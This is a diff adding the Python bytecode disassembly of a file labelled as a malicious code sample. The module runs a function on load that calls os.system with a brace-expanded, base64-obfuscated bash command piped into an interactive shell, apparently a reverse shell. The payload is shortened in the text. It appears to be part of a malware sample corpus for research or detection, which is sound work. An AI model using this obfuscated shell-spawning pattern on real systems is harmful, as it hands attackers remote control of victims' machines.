@@ -1,0 +1,53 @@
+  1           0 LOAD_CONST               0 (0)
+              2 LOAD_CONST               1 (None)
+              4 IMPORT_NAME              0 (os)
+              6 STORE_NAME               0 (os)
+
+  3           8 LOAD_CONST               2 (<code object do_get at 0x106b218f0, file "malicious_code/py/Listing1/sample1.py", line 3>)
+             10 LOAD_CONST               3 ('do_get')
+             12 MAKE_FUNCTION            0
+             14 STORE_NAME               1 (do_get)
+
+  9          16 LOAD_NAME                1 (do_get)
+             18 CALL_FUNCTION            0
+             20 POP_TOP
+             22 LOAD_CONST               1 (None)
+             24 RETURN_VALUE
+
+Disassembly of <code object do_get at 0x106b218f0, file "malicious_code/py/Listing1/sample1.py", line 3>:
+  4           0 SETUP_FINALLY            8 (to 18)
+
+  5           2 LOAD_GLOBAL              0 (os)
+              4 LOAD_METHOD              1 (system)
+              6 LOAD_CONST               1 ('bash -c {echo,YmFz**SHORTENED**JjE=}|{base64,-d}|{bash,-i}')
+              8 CALL_METHOD              1
+             10 POP_TOP
+             12 POP_BLOCK
+             14 LOAD_CONST               0 (None)
+             16 RETURN_VALUE
+
+  6     >>   18 DUP_TOP
+             20 LOAD_GLOBAL              2 (Exception)
+             22 JUMP_IF_NOT_EXC_MATCH    31 (to 62)
+             24 POP_TOP
+             26 STORE_FAST               0 (e)
+             28 POP_TOP
+             30 SETUP_FINALLY           11 (to 54)
+
+  7          32 LOAD_GLOBAL              3 (print)
+             34 LOAD_FAST                0 (e)
+             36 CALL_FUNCTION            1
+             38 POP_TOP
+             40 POP_BLOCK
+             42 POP_EXCEPT
+             44 LOAD_CONST               0 (None)
+             46 STORE_FAST               0 (e)
+             48 DELETE_FAST              0 (e)
+             50 LOAD_CONST               0 (None)
+             52 RETURN_VALUE
+        >>   54 LOAD_CONST               0 (None)
+             56 STORE_FAST               0 (e)
+             58 DELETE_FAST              0 (e)
+             60 RERAISE                  1
+
+  6     >>   62 RERAISE                  0
